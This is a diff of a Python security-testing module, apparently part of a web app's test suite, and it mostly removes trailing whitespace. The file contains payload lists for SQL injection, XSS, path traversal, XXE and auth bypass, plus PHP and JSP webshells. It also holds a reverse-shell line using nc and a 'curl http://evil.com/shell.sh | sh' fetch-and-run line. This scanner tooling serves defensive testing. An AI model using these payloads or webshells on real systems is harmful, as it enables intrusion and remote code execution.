@@ -69,7 +69,7 @@ class SecurityTestResult:
     details: str = ""
     mitigation: str = ""
     timestamp: float = field(default_factory=time.time)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary for reporting."""
         return {
@@ -86,7 +86,7 @@ class SecurityTestResult:
 
 class PayloadGenerator:
     """Generate various attack payloads for security testing."""
-    
+
     # SQL Injection payloads
     SQL_INJECTION_PAYLOADS = [
         # Basic injections
@@ -97,34 +97,34 @@ class PayloadGenerator:
         "admin'--",
         "admin' #",
         "admin'/*",
-        
+
         # Union-based injections
         "' UNION SELECT NULL--",
         "' UNION SELECT 1,2,3--",
         "' UNION ALL SELECT NULL,NULL,NULL--",
         "' UNION SELECT username, password FROM users--",
-        
+
         # Time-based blind injections
         "'; WAITFOR DELAY '00:00:05'--",
         "'; SELECT SLEEP(5)--",
         "' AND SLEEP(5)--",
         "' OR SLEEP(5)--",
-        
+
         # Boolean-based blind injections
         "' AND 1=1--",
         "' AND 1=2--",
         "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--",
-        
+
         # Stacked queries
         "'; DROP TABLE users--",
         "'; INSERT INTO users VALUES (1,'admin','password')--",
         "'; UPDATE users SET password='hacked'--",
-        
+
         # Advanced payloads
         "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
         "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
         "' AND EXISTS(SELECT * FROM users)--",
-        
+
         # NoSQL injection payloads
         '{"$ne": null}',
         '{"$gt": ""}',
@@ -132,7 +132,7 @@ class PayloadGenerator:
         '{"username": {"$ne": null}, "password": {"$ne": null}}',
         '{"$where": "this.password == \'password\'"}',
     ]
-    
+
     # XSS payloads
     XSS_PAYLOADS = [
         # Basic XSS
@@ -140,46 +140,46 @@ class PayloadGenerator:
         "<img src=x onerror=alert('XSS')>",
         "<svg onload=alert('XSS')>",
         "<body onload=alert('XSS')>",
-        
+
         # Event handler XSS
         "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
         "<input onfocus=alert('XSS') autofocus>",
         "<select onfocus=alert('XSS') autofocus>",
         "<textarea onfocus=alert('XSS') autofocus>",
         "<button onclick=alert('XSS')>Click</button>",
-        
+
         # JavaScript protocol XSS
         "javascript:alert('XSS')",
         "javascript:alert(document.cookie)",
         "javascript:alert(document.domain)",
-        
+
         # Data URI XSS
         "data:text/html,<script>alert('XSS')</script>",
         "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
-        
+
         # DOM-based XSS
         "#<script>alert('XSS')</script>",
         "?name=<script>alert('XSS')</script>",
-        
+
         # Encoded XSS
         "%3Cscript%3Ealert('XSS')%3C/script%3E",
         "&#60;script&#62;alert('XSS')&#60;/script&#62;",
         "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
-        
+
         # Polyglot XSS
         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
-        
+
         # Filter bypass XSS
         "<ScRiPt>alert('XSS')</ScRiPt>",
         "<script>alert`XSS`</script>",
         "<script>alert(/XSS/)</script>",
         "<<SCRIPT>alert('XSS');//<</SCRIPT>",
-        
+
         # CSS-based XSS
         "<style>body{background:url('javascript:alert(1)')}</style>",
         "<link rel=stylesheet href=javascript:alert('XSS')>",
     ]
-    
+
     # Path traversal payloads
     PATH_TRAVERSAL_PAYLOADS = [
         "../",
@@ -203,7 +203,7 @@ class PayloadGenerator:
         "file:///etc/passwd",
         "file://c:/windows/system32/config/sam",
     ]
-    
+
     # Command injection payloads
     COMMAND_INJECTION_PAYLOADS = [
         "; ls -la",
@@ -230,7 +230,7 @@ class PayloadGenerator:
         "| nc -e /bin/sh 127.0.0.1 4444",
         "; curl http://evil.com/shell.sh | sh",
     ]
-    
+
     # LDAP injection payloads
     LDAP_INJECTION_PAYLOADS = [
         "*",
@@ -245,7 +245,7 @@ class PayloadGenerator:
         "*)(&(password=*))",
         "*)(|(objectclass=*))",
     ]
-    
+
     # XXE payloads
     XXE_PAYLOADS = [
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
@@ -253,7 +253,7 @@ class PayloadGenerator:
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
     ]
-    
+
     # CSRF tokens for testing
     CSRF_TOKENS = [
         "",  # Empty token
@@ -262,7 +262,7 @@ class PayloadGenerator:
         "<script>alert('XSS')</script>",
         "../../../etc/passwd",
     ]
-    
+
     # Authentication bypass payloads
     AUTH_BYPASS_PAYLOADS = [
         {"username": "admin", "password": "' OR '1'='1"},
@@ -274,7 +274,7 @@ class PayloadGenerator:
         {"username": "", "password": ""},
         {"username": None, "password": None},
     ]
-    
+
     @classmethod
     def generate_sql_injection_payloads(cls, context: str = "") -> List[str]:
         """Generate SQL injection payloads with optional context."""
@@ -287,7 +287,7 @@ class PayloadGenerator:
                 f"{context}'; DROP TABLE users--",
             ])
         return payloads
-    
+
     @classmethod
     def generate_xss_payloads(cls, context: str = "") -> List[str]:
         """Generate XSS payloads with optional context."""
@@ -299,18 +299,18 @@ class PayloadGenerator:
                 f"{context}<img src=x onerror=alert('XSS')>",
             ])
         return payloads
-    
+
     @classmethod
     def generate_fuzzing_inputs(cls, base_input: str = "", count: int = 100) -> List[str]:
         """Generate fuzzing inputs for boundary testing."""
         fuzz_inputs = []
-        
+
         # Buffer overflow attempts
         for size in [100, 1000, 10000, 100000]:
             fuzz_inputs.append("A" * size)
             fuzz_inputs.append("%" * size)
             fuzz_inputs.append("\x00" * size)
-        
+
         # Format string attacks
         fuzz_inputs.extend([
             "%s" * 100,
@@ -319,12 +319,12 @@ class PayloadGenerator:
             "%d" * 100,
             "%.2147483647d",
         ])
-        
+
         # Special characters
         special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
         for char in special_chars:
             fuzz_inputs.append(char * 100)
-        
+
         # Unicode and encoding tests
         fuzz_inputs.extend([
             "\u0000" * 100,
@@ -332,12 +332,12 @@ class PayloadGenerator:
             "🔥" * 100,
             "\x00\x01\x02\x03" * 100,
         ])
-        
+
         # Random inputs
         for _ in range(count):
             length = random.randint(1, 1000)
             fuzz_inputs.append(''.join(random.choices(string.printable, k=length)))
-        
+
         if base_input:
             # Add variations of base input
             fuzz_inputs.extend([
@@ -346,132 +346,132 @@ class PayloadGenerator:
                 base_input + "<script>alert('XSS')</script>",
                 base_input + "../../../etc/passwd",
             ])
-        
+
         return fuzz_inputs
-    
+
     @classmethod
     def generate_malicious_files(cls) -> List[Tuple[str, bytes, str]]:
         """Generate malicious file uploads for testing.
         Returns: List of (filename, content, content_type) tuples
         """
         files = []
-        
+
         # PHP webshell
         files.append((
             "shell.php",
             b"<?php system($_GET['cmd']); ?>",
             "application/x-php"
         ))
-        
+
         # JSP webshell
         files.append((
             "shell.jsp",
             b"<%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
             "application/x-jsp"
         ))
-        
+
         # Polyglot file (JPEG + JS)
         files.append((
             "image.jpg",
             b"\xff\xd8\xff\xe0<script>alert('XSS')</script>",
             "image/jpeg"
         ))
-        
+
         # SVG with embedded JavaScript
         files.append((
             "image.svg",
             b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
             "image/svg+xml"
         ))
-        
+
         # PDF with embedded JavaScript
         files.append((
             "document.pdf",
             b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>>>>>>/Contents 4 0 R>>endobj\n4 0 obj<</Length 44>>stream\nBT /F1 12 Tf 100 700 Td (JavaScript: app.alert('XSS')) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000260 00000 n\ntrailer<</Size 5/Root 1 0 R>>\nstartxref\n348\n%%EOF",
             "application/pdf"
         ))
-        
+
         # Zip bomb (small version for testing)
         files.append((
             "bomb.zip",
             b"PK\x03\x04" + b"A" * 1000000,  # Simplified zip bomb
             "application/zip"
         ))
-        
+
         # XML with XXE
         files.append((
             "xxe.xml",
             b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             "application/xml"
         ))
-        
+
         # HTML with stored XSS
         files.append((
             "xss.html",
             b"<html><body><script>alert('Stored XSS')</script></body></html>",
             "text/html"
         ))
-        
+
         # Executable disguised as image
         files.append((
             "image.jpg.exe",
             b"MZ\x90\x00\x03",  # PE header
             "image/jpeg"
         ))
-        
+
         # Path traversal filename
         files.append((
             "../../../etc/passwd",
             b"root:x:0:0:root:/root:/bin/bash",
             "text/plain"
         ))
-        
+
         return files
 
 
 class SecurityScanner:
     """Automated security vulnerability scanner."""
-    
+
     def __init__(self, client: TestClient, base_url: str = ""):
         self.client = client
         self.base_url = base_url
         self.results: List[SecurityTestResult] = []
         self.payload_generator = PayloadGenerator()
-    
-    async def scan_endpoint(self, 
-                           method: str, 
-                           endpoint: str, 
+
+    async def scan_endpoint(self,
+                           method: str,
+                           endpoint: str,
                            params: Optional[Dict] = None,
                            data: Optional[Dict] = None,
                            headers: Optional[Dict] = None) -> List[SecurityTestResult]:
         """Scan a single endpoint for vulnerabilities."""
         results = []
-        
+
         # SQL Injection scan
         results.extend(await self._scan_sql_injection(method, endpoint, params, data, headers))
-        
+
         # XSS scan
         results.extend(await self._scan_xss(method, endpoint, params, data, headers))
-        
+
         # Path traversal scan
         results.extend(await self._scan_path_traversal(method, endpoint, params, data, headers))
-        
+
         # Command injection scan
         results.extend(await self._scan_command_injection(method, endpoint, params, data, headers))
-        
+
         # Authentication bypass scan
         results.extend(await self._scan_auth_bypass(method, endpoint, params, data, headers))
-        
+
         self.results.extend(results)
         return results
-    
-    async def _scan_sql_injection(self, method: str, endpoint: str, 
-                                 params: Optional[Dict], data: Optional[Dict], 
+
+    async def _scan_sql_injection(self, method: str, endpoint: str,
+                                 params: Optional[Dict], data: Optional[Dict],
                                  headers: Optional[Dict]) -> List[SecurityTestResult]:
         """Scan for SQL injection vulnerabilities."""
         results = []
         payloads = self.payload_generator.generate_sql_injection_payloads()
-        
+
         for payload in payloads:
             # Test in parameters
             if params:
@@ -484,7 +484,7 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-            
+
             # Test in body data
             if data:
                 for key in data.keys():
@@ -496,16 +496,16 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-        
+
         return results
-    
-    async def _scan_xss(self, method: str, endpoint: str, 
-                        params: Optional[Dict], data: Optional[Dict], 
+
+    async def _scan_xss(self, method: str, endpoint: str,
+                        params: Optional[Dict], data: Optional[Dict],
                         headers: Optional[Dict]) -> List[SecurityTestResult]:
         """Scan for XSS vulnerabilities."""
         results = []
         payloads = self.payload_generator.generate_xss_payloads()
-        
+
         for payload in payloads:
             # Test in parameters
             if params:
@@ -518,7 +518,7 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-            
+
             # Test in body data
             if data:
                 for key in data.keys():
@@ -530,15 +530,15 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-        
+
         return results
-    
-    async def _scan_path_traversal(self, method: str, endpoint: str, 
-                                   params: Optional[Dict], data: Optional[Dict], 
+
+    async def _scan_path_traversal(self, method: str, endpoint: str,
+                                   params: Optional[Dict], data: Optional[Dict],
                                    headers: Optional[Dict]) -> List[SecurityTestResult]:
         """Scan for path traversal vulnerabilities."""
         results = []
-        
+
         for payload in PayloadGenerator.PATH_TRAVERSAL_PAYLOADS:
             # Test in URL path
             test_endpoint = endpoint.replace("{id}", payload) if "{id}" in endpoint else endpoint
@@ -549,7 +549,7 @@ class SecurityScanner:
                 )
                 if result:
                     results.append(result)
-            
+
             # Test in parameters
             if params:
                 for key in params.keys():
@@ -561,15 +561,15 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-        
+
         return results
-    
-    async def _scan_command_injection(self, method: str, endpoint: str, 
-                                     params: Optional[Dict], data: Optional[Dict], 
+
+    async def _scan_command_injection(self, method: str, endpoint: str,
+                                     params: Optional[Dict], data: Optional[Dict],
                                      headers: Optional[Dict]) -> List[SecurityTestResult]:
         """Scan for command injection vulnerabilities."""
         results = []
-        
+
         for payload in PayloadGenerator.COMMAND_INJECTION_PAYLOADS:
             # Test in parameters
             if params:
@@ -582,7 +582,7 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-            
+
             # Test in body data
             if data:
                 for key in data.keys():
@@ -594,15 +594,15 @@ class SecurityScanner:
                     )
                     if result:
                         results.append(result)
-        
+
         return results
-    
-    async def _scan_auth_bypass(self, method: str, endpoint: str, 
-                               params: Optional[Dict], data: Optional[Dict], 
+
+    async def _scan_auth_bypass(self, method: str, endpoint: str,
+                               params: Optional[Dict], data: Optional[Dict],
                                headers: Optional[Dict]) -> List[SecurityTestResult]:
         """Scan for authentication bypass vulnerabilities."""
         results = []
-        
+
         for payload in PayloadGenerator.AUTH_BYPASS_PAYLOADS:
             result = await self._test_payload(
                 method, endpoint, params, payload, headers,
@@ -610,12 +610,12 @@ class SecurityScanner:
             )
             if result:
                 results.append(result)
-        
+
         return results
-    
-    async def _test_payload(self, method: str, endpoint: str, 
-                           params: Optional[Dict], data: Optional[Dict], 
-                           headers: Optional[Dict], payload: str, 
+
+    async def _test_payload(self, method: str, endpoint: str,
+                           params: Optional[Dict], data: Optional[Dict],
+                           headers: Optional[Dict], payload: str,
                            attack_vector: AttackVector) -> Optional[SecurityTestResult]:
         """Test a single payload and analyze response."""
         try:
@@ -630,10 +630,10 @@ class SecurityScanner:
                 response = self.client.delete(endpoint, params=params, headers=headers)
             else:
                 return None
-            
+
             # Analyze response for vulnerability indicators
             vulnerable = self._analyze_response(response, payload, attack_vector)
-            
+
             if vulnerable:
                 return SecurityTestResult(
                     test_name=f"{attack_vector.value}_{endpoint}",
@@ -656,17 +656,17 @@ class SecurityScanner:
                 details=f"Error during testing: {str(e)}",
                 mitigation=self._get_mitigation(attack_vector)
             )
-        
+
         return None
-    
+
     def _analyze_response(self, response: Any, payload: str, attack_vector: AttackVector) -> bool:
         """Analyze response for vulnerability indicators."""
         if not response:
             return False
-        
+
         response_text = str(response.text) if hasattr(response, 'text') else str(response)
         response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
-        
+
         # SQL Injection indicators
         if attack_vector == AttackVector.SQL_INJECTION:
             sql_errors = [
@@ -680,11 +680,11 @@ class SecurityScanner:
             for error in sql_errors:
                 if error.lower() in response_text.lower():
                     return True
-            
+
             # Check for successful injection (e.g., returning all records)
             if response.status_code == 200 and "admin" in response_text.lower():
                 return True
-        
+
         # XSS indicators
         elif attack_vector == AttackVector.XSS:
             # Check if payload is reflected without encoding
@@ -698,7 +698,7 @@ class SecurityScanner:
                 return True
             if 'Content-Security-Policy' not in response_headers:
                 return True
-        
+
         # Path traversal indicators
         elif attack_vector == AttackVector.PATH_TRAVERSAL:
             path_indicators = [
@@ -709,7 +709,7 @@ class SecurityScanner:
             for indicator in path_indicators:
                 if indicator in response_text:
                     return True
-        
+
         # Command injection indicators
         elif attack_vector == AttackVector.COMMAND_INJECTION:
             cmd_indicators = [
@@ -722,20 +722,20 @@ class SecurityScanner:
             for indicator in cmd_indicators:
                 if indicator in response_text:
                     return True
-        
+
         # Authentication bypass indicators
         elif attack_vector == AttackVector.AUTH_BYPASS:
             if response.status_code in [200, 201, 204]:
                 # Check if we got admin/privileged access
                 if any(word in response_text.lower() for word in ["admin", "dashboard", "success", "welcome"]):
                     return True
-        
+
         # Generic error indicators
         if response.status_code >= 500:
             return True
-        
+
         return False
-    
+
     def _determine_severity(self, attack_vector: AttackVector, response: Any) -> SecuritySeverity:
         """Determine severity of detected vulnerability."""
         critical_vectors = [
@@ -744,14 +744,14 @@ class SecurityScanner:
             AttackVector.AUTH_BYPASS,
             AttackVector.INSECURE_DESERIALIZATION
         ]
-        
+
         high_vectors = [
             AttackVector.XSS,
             AttackVector.XXE,
             AttackVector.SSRF,
             AttackVector.PATH_TRAVERSAL
         ]
-        
+
         if attack_vector in critical_vectors:
             return SecuritySeverity.CRITICAL
         elif attack_vector in high_vectors:
@@ -760,7 +760,7 @@ class SecurityScanner:
             return SecuritySeverity.HIGH
         else:
             return SecuritySeverity.MEDIUM
-    
+
     def _get_mitigation(self, attack_vector: AttackVector) -> str:
         """Get mitigation recommendations for vulnerability."""
         mitigations = {
@@ -774,20 +774,20 @@ class SecurityScanner:
             AttackVector.RATE_LIMITING: "Implement rate limiting, use CAPTCHA, monitor for abuse",
         }
         return mitigations.get(attack_vector, "Implement proper input validation and security controls")
-    
+
     def generate_report(self) -> Dict[str, Any]:
         """Generate security scan report."""
         if not self.results:
             return {"status": "no_vulnerabilities", "results": []}
-        
+
         vulnerable_count = sum(1 for r in self.results if r.vulnerable)
         severity_counts = {}
         for severity in SecuritySeverity:
             severity_counts[severity.value] = sum(
-                1 for r in self.results 
+                1 for r in self.results
                 if r.vulnerable and r.severity == severity
             )
-        
+
         return {
             "total_tests": len(self.results),
             "vulnerabilities_found": vulnerable_count,
@@ -799,9 +799,9 @@ class SecurityScanner:
 
 class SecurityTestFixtures:
     """Common fixtures for security testing."""
-    
+
     @staticmethod
-    def create_mock_user(user_id: int = 1, username: str = "testuser", 
+    def create_mock_user(user_id: int = 1, username: str = "testuser",
                         role: str = "user") -> Dict[str, Any]:
         """Create a mock user for testing."""
         return {
@@ -812,13 +812,13 @@ class SecurityTestFixtures:
             "is_active": True,
             "created_at": time.time()
         }
-    
+
     @staticmethod
     def create_mock_session(user_id: int = 1, session_id: str = None) -> Dict[str, Any]:
         """Create a mock session for testing."""
         if not session_id:
             session_id = hashlib.sha256(f"session_{user_id}_{time.time()}".encode()).hexdigest()
-        
+
         return {
             "session_id": session_id,
             "user_id": user_id,
@@ -827,7 +827,7 @@ class SecurityTestFixtures:
             "ip_address": "127.0.0.1",
             "user_agent": "SecurityTestClient/1.0"
         }
-    
+
     @staticmethod
     def create_malicious_pdf() -> bytes:
         """Create a malicious PDF for testing."""
@@ -871,13 +871,13 @@ trailer
 startxref
 294
 %%EOF"""
-    
+
     @staticmethod
     def create_test_database() -> Session:
         """Create a test database session."""
         from sqlalchemy import create_engine
         from sqlalchemy.orm import sessionmaker
-        
+
         engine = create_engine("sqlite:///:memory:")
         SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
         return SessionLocal()
@@ -885,11 +885,11 @@ startxref
 
 class SecurityMonitor:
     """Monitor and track security events during testing."""
-    
+
     def __init__(self):
         self.events: List[Dict[str, Any]] = []
         self.alerts: List[Dict[str, Any]] = []
-        
+
     def log_event(self, event_type: str, details: Dict[str, Any]):
         """Log a security event."""
         event = {
@@ -898,11 +898,11 @@ class SecurityMonitor:
             "details": details
         }
         self.events.append(event)
-        
+
         # Check if event should trigger an alert
         if self._should_alert(event_type, details):
             self.create_alert(event_type, details)
-    
+
     def create_alert(self, alert_type: str, details: Dict[str, Any]):
         """Create a security alert."""
         alert = {
@@ -912,7 +912,7 @@ class SecurityMonitor:
             "details": details
         }
         self.alerts.append(alert)
-    
+
     def _should_alert(self, event_type: str, details: Dict[str, Any]) -> bool:
         """Determine if an event should trigger an alert."""
         alert_triggers = [
@@ -924,19 +924,19 @@ class SecurityMonitor:
             "malicious_file_upload"
         ]
         return event_type in alert_triggers
-    
+
     def _determine_alert_severity(self, alert_type: str) -> str:
         """Determine alert severity."""
         critical_alerts = ["sql_injection_attempt", "privilege_escalation_attempt"]
         high_alerts = ["xss_attempt", "authentication_failure", "malicious_file_upload"]
-        
+
         if alert_type in critical_alerts:
             return "critical"
         elif alert_type in high_alerts:
             return "high"
         else:
             return "medium"
-    
+
     def get_summary(self) -> Dict[str, Any]:
         """Get summary of security events and alerts."""
         return {
@@ -952,35 +952,35 @@ class SecurityMonitor:
 # Async security testing utilities
 class AsyncSecurityTester:
     """Async utilities for concurrent security testing."""
-    
+
     @staticmethod
-    async def concurrent_attack(client: TestClient, endpoint: str, 
+    async def concurrent_attack(client: TestClient, endpoint: str,
                                payloads: List[str], concurrency: int = 10) -> List[Any]:
         """Execute concurrent attacks for race condition testing."""
         import aiohttp
         import asyncio
-        
+
         async def attack_with_payload(session: aiohttp.ClientSession, payload: str):
             try:
                 async with session.post(endpoint, json={"data": payload}) as response:
                     return await response.json()
             except Exception as e:
                 return {"error": str(e)}
-        
+
         async with aiohttp.ClientSession() as session:
             tasks = []
             for payload in payloads[:concurrency]:
                 tasks.append(attack_with_payload(session, payload))
-            
+
             results = await asyncio.gather(*tasks)
             return results
-    
+
     @staticmethod
-    async def timing_attack(client: TestClient, endpoint: str, 
+    async def timing_attack(client: TestClient, endpoint: str,
                            payloads: List[str]) -> Dict[str, float]:
         """Perform timing attack analysis."""
         timings = {}
-        
+
         for payload in payloads:
             start_time = time.time()
             try:
@@ -989,7 +989,7 @@ class AsyncSecurityTester:
                 timings[payload] = elapsed
             except:
                 timings[payload] = -1
-        
+
         return timings
 
 
